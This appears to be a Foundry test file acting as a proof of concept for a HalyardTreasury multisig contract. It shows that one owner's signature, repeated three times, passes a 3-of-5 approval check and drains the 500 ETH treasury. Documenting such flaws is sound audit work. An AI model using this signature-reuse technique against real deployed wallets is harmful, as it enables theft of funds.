// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {HalyardTreasury} from "../src/HalyardTreasury.sol";

contract DuplicateSignatureTest is Test {
    HalyardTreasury internal treasury;

    address internal mallory;
    uint256 internal malloryKey;
    address internal recipient = makeAddr("recipient");

    function setUp() public {
        (mallory, malloryKey) = makeAddrAndKey("mallory");

        address[] memory owners = new address[](5);
        owners[0] = mallory;
        owners[1] = makeAddr("owner-2");
        owners[2] = makeAddr("owner-3");
        owners[3] = makeAddr("owner-4");
        owners[4] = makeAddr("owner-5");

        // A 3-of-5 treasury holding 500 ETH.
        treasury = new HalyardTreasury(owners, 3);
        vm.deal(address(treasury), 500 ether);
    }

    function _sign(address to, uint256 value) internal view returns (bytes memory) {
        bytes32 digest = treasury.txDigest(to, value, "", treasury.nonce());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(malloryKey, digest);
        return abi.encodePacked(r, s, v);
    }

    /// Control: one signature, sent once, is refused.
    function test_control_oneSignatureIsRefused() public {
        bytes[] memory signatures = new bytes[](1);
        signatures[0] = _sign(recipient, 500 ether);

        vm.expectRevert(abi.encodeWithSelector(HalyardTreasury.NotEnoughApprovals.selector, 1, 3));
        treasury.execute(recipient, 500 ether, "", signatures);

        assertEq(address(treasury).balance, 500 ether);
    }

    /// The same signature, sent three times, passes the 3-of-5 check.
    function test_oneOwnerEmptiesTreasuryWithRepeatedSignature() public {
        assertEq(treasury.threshold(), 3);
        assertEq(address(treasury).balance, 500 ether);
        assertEq(recipient.balance, 0);

        bytes memory signature = _sign(recipient, 500 ether);
        bytes[] memory signatures = new bytes[](3);
        signatures[0] = signature;
        signatures[1] = signature;
        signatures[2] = signature;

        // Anyone can submit: execute() has no caller check.
        vm.prank(makeAddr("relayer"));
        treasury.execute(recipient, 500 ether, "", signatures);

        console2.log("treasury balance after (wei)", address(treasury).balance);
        console2.log("recipient balance after (ETH)", recipient.balance / 1 ether);

        assertEq(address(treasury).balance, 0);
        assertEq(recipient.balance, 500 ether);
        assertEq(treasury.nonce(), 1);
        assertEq(treasury.threshold(), 3);
    }
}
